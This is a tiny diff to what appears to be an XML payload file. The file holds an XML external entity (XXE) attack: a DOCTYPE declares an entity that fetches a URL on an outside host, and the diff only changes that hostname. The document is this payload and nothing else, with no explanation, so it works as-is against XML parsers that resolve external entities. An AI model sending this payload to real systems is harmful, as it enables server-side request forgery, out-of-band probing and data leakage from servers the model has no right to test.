@@ -1,4 +1,4 @@
 <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "http://gtrt.a.blueotter.info" >]><foo>&xxe;</foo>
+  <!ENTITY xxe SYSTEM "http://gtrt1.a.blueotter.info" >]><foo>&xxe;</foo>
